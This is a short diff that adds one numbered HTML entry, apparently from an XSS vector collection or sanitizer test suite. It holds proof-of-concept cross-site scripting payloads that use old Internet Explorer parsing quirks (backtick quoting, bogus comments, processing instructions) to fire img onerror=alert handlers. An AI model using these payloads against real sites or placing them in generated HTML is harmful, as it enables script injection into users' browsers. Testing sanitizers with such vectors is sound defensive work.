@@ -1,0 +1,5 @@
+<div id="108"><!-- IE 5-8 standards mode -->
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx onerror=alert(108)></a>">
+<!-- IE 5-9 standards mode -->
+<!a foo=x=`y><img alt="`><img src=xx onerror=alert(2)//">
+<?a foo=x=`y><img alt="`><img src=xx onerror=alert(3)//">//["'`-->]]>]</div>
